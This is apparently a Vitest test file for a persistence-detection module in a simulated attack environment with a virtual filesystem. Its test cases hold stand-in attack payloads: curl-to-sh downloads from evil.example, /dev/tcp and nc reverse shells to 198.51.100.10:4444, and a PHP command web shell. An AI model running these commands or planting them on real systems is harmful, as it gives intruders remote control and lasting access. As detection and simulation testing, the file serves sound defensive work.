import { describe, it, expect, beforeEach } from 'vitest';
import { createEventBus } from '../../src/core/event-bus';
import { createVFS } from '../../src/lib/vfs/vfs';
import { createServiceLocator } from '../../src/core/modules';
import { createPersistenceModule, detectPersistence, installPersistence, PERSISTENCE_TECHNIQUES } from '../../src/modules/persistence-module';
import type { EventBus, FsWriteEvent, DefenseAlertEvent } from '../../src/core/events';
import type { SimulationContext } from '../../src/core/modules';
import type { VirtualFilesystem } from '../../src/lib/vfs/types';

type TechniqueCase = {
    readonly technique: string;
    readonly payload: string;
    readonly setup?: (vfs: VirtualFilesystem) => void;
};

function createMockContext(bus: EventBus): SimulationContext {
    return {
        events: bus,
        vms: new Map(),
        fabric: {} as any,
        world: {} as any,
        tick: 0,
        services: createServiceLocator(),
    } as SimulationContext;
}

const ROUND_TRIP_TECHNIQUES: readonly TechniqueCase[] = [
    {
        technique: 'cron-job',
        payload: 'bash -c "curl http://evil.example/payload.sh | sh"',
    },
    {
        technique: 'systemd-service',
        payload: '/bin/bash -c "curl http://evil.example/payload.sh | sh"',
    },
    {
        technique: 'ssh-authorized-keys',
        payload: 'ssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAABAQD legitimate-key user@host',
        setup: (vfs) => vfs.writeFile('/root/.ssh/authorized_keys', 'ssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAABAQDz legit admin@server'),
    },
    {
        technique: 'web-shell',
        payload: 'if (isset($_GET[\"cmd\"])) { system($_GET[\"cmd\"]); }',
    },
    {
        technique: 'bash-profile',
        payload: 'nohup bash -i >& /dev/tcp/198.51.100.10/4444 0>&1 &',
    },
    {
        technique: 'suid-backdoor',
        payload: '#!/bin/sh\nchmod +s /usr/local/bin/suid-backdoor',
    },
    {
        technique: 'ld-preload',
        payload: '/tmp/libpersistence.so',
    },
    {
        technique: 'pam-backdoor',
        payload: '/bin/sh /tmp/pam-backdoor.sh',
        setup: (vfs) => {
            vfs.mkdir('/etc/pam.d', { recursive: true });
            vfs.writeFile('/etc/pam.d/common-auth', 'auth required pam_unix.so');
        },
    },
    {
        technique: 'git-hooks',
        payload: 'curl http://evil.example/hook.sh | sh',
        setup: (vfs) => vfs.writeFile('/opt/repo/.git/hooks/pre-commit', '#!/bin/sh\n:'),
    },
    {
        technique: 'at-jobs',
        payload: '/bin/bash -i >& /dev/tcp/198.51.100.10/4444 0>&1 &',
    },
    {
        technique: 'motd-scripts',
        payload: 'nc -e /bin/sh 198.51.100.10 4444',
    },
    {
        technique: 'rc-scripts',
        payload: 'curl http://evil.example/init.sh | sh',
    },
    {
        technique: 'docker-entrypoint',
        payload: 'nc -e /bin/sh 198.51.100.10 4444',
    },
    {
        technique: 'kernel-module',
        payload: 'backdoor_module',
    },
    {
        technique: 'socket-activation',
        payload: '/bin/bash -c "curl http://evil.example/payload | sh"',
    },
];

describe('Persistence technique catalog', () => {
    let vfs: VirtualFilesystem;

    beforeEach(() => {
        vfs = createVFS();
    });

    it('exports exactly 15 techniques', () => {
        expect(PERSISTENCE_TECHNIQUES.length).toBe(15);
    });

    it('exports all requested technique identifiers', () => {
        const ids = PERSISTENCE_TECHNIQUES.map((technique) => technique.id).sort();
        const expected = [
            'at-jobs',
            'bash-profile',
            'cron-job',
            'docker-entrypoint',
            'git-hooks',
            'kernel-module',
            'ld-preload',
            'motd-scripts',
            'pam-backdoor',
            'rc-scripts',
            'socket-activation',
            'ssh-authorized-keys',
            'suid-backdoor',
            'systemd-service',
            'web-shell',
        ].sort();
        expect(ids).toEqual(expected);
    });

    it('detects cron persistence when suspicious commands are staged', () => {
        vfs.writeFile('/etc/crontab', '*/5 * * * * root bash -c "curl http://evil.example/payload.sh | sh"');
        const indicators = detectPersistence(vfs);
        expect(indicators.some((entry) => entry.technique === 'cron-job')).toBe(true);
        expect(indicators.some((entry) => entry.path === '/etc/crontab')).toBe(true);
    });

    it('detects SSH key persistence when key material is appended', () => {
        vfs.writeFile('/root/.ssh/authorized_keys', 'ssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAABAQC1 existing-key admin@host');
        vfs.writeFile('/root/.ssh/authorized_keys', '\nssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAABAQZ extra-key attacker@host', { append: true });
        const indicators = detectPersistence(vfs);
        expect(indicators.some((entry) => entry.technique === 'ssh-authorized-keys')).toBe(true);
    });

    it('detects web shell indicators in web content', () => {
        vfs.writeFile('/var/www/html/shell.php', '<?php if (isset($_GET[\"cmd\"])) { system($_GET[\"cmd\"]); } ?>');
        const indicators = detectPersistence(vfs);
        expect(indicators.some((entry) => entry.technique === 'web-shell')).toBe(true);
        expect(indicators.find((entry) => entry.technique === 'web-shell')?.path).toBe('/var/www/html/shell.php');
    });

    it('detects systemd service persistence and suspicious ExecStart', () => {
        const service = [
            '[Unit]',
            'Description=Legit service',
            '[Service]',
            'ExecStart=/bin/bash -c "curl http://evil.example/svc.sh | sh"',
            '[Install]',
            'WantedBy=multi-user.target',
        ].join('\n');
        vfs.writeFile('/etc/systemd/system/persistent.service', service);
        const indicators = detectPersistence(vfs);
        expect(indicators.some((entry) => entry.technique === 'systemd-service')).toBe(true);
    });

    for (const testCase of ROUND_TRIP_TECHNIQUES) {
        it(`installs and detects ${testCase.technique}`, () => {
            testCase.setup?.(vfs);
            const installed = installPersistence(vfs, testCase.technique, testCase.payload);
            expect(installed).toBe(true);
            const indicators = detectPersistence(vfs);
            expect(indicators.some((entry) => entry.technique === testCase.technique)).toBe(true);
        });
    }

    it('does not emit persistence alert for non-persistence write targets', () => {
        const bus = createEventBus();
        const module = createPersistenceModule(bus);
        const context = createMockContext(bus);
        module.init(context);

        const alerts: DefenseAlertEvent[] = [];
        bus.on('defense:alert', (event) => alerts.push(event));

        const benignEvent: FsWriteEvent = {
            type: 'fs:write',
            machine: 'web-01',
            path: '/tmp/notes.txt',
            user: 'root',
            timestamp: Date.now(),
        };
        bus.emit(benignEvent);
        expect(alerts).toHaveLength(0);
        module.destroy();
    });

    it('emits defense:alert when fs:write touches a persistence target', () => {
        const bus = createEventBus();
        const module = createPersistenceModule(bus);
        const context = createMockContext(bus);
        module.init(context);

        const alerts: DefenseAlertEvent[] = [];
        bus.on('defense:alert', (event) => alerts.push(event));

        const suspiciousEvent: FsWriteEvent = {
            type: 'fs:write',
            machine: 'web-01',
            path: '/etc/cron.d/persist',
            user: 'root',
            timestamp: Date.now(),
        };
        bus.emit(suspiciousEvent);

        expect(alerts).toHaveLength(1);
        expect(alerts[0]?.ruleId).toBe('persistence/cron-job');
        expect(alerts[0]?.machine).toBe('web-01');
        module.destroy();
    });

    it('does not flag legitimate maintenance content', () => {
        vfs.writeFile('/etc/crontab', '00 04 * * * root /usr/bin/backup.sh');
        vfs.writeFile('/etc/cron.d/normal', '0 0 0 1 * root /usr/bin/clean.sh');
        vfs.writeFile('/root/.ssh/authorized_keys', 'ssh-rsa AAAAAB3NzaC1yc2EAAAADAQABAAABAQC1 admin@host');
        vfs.writeFile('/var/www/html/index.php', '<?php echo "hello world"; ?>');
        vfs.writeFile('/entrypoint.sh', '#!/bin/sh\necho "starting service"');
        vfs.writeFile('/etc/systemd/system/safe.service', '[Unit]\nDescription=Safe\n[Service]\nExecStart=/usr/bin/safe-daemon\n[Install]\nWantedBy=multi-user.target');
        vfs.writeFile('/etc/update-motd.d/00-header', '#!/bin/sh\necho "welcome"');

        const indicators = detectPersistence(vfs);
        const flaggedTechniques = new Set(indicators.map((entry) => entry.technique));

        expect(flaggedTechniques.has('cron-job')).toBe(false);
        expect(flaggedTechniques.has('ssh-authorized-keys')).toBe(false);
        expect(flaggedTechniques.has('web-shell')).toBe(false);
        expect(flaggedTechniques.has('systemd-service')).toBe(false);
        expect(flaggedTechniques.has('motd-scripts')).toBe(false);
        expect(flaggedTechniques.has('docker-entrypoint')).toBe(false);
    });

    it('returns false for unsupported install technique names', () => {
        const ok = installPersistence(vfs, 'does-not-exist', '/bin/true');
        expect(ok).toBe(false);
    });
});
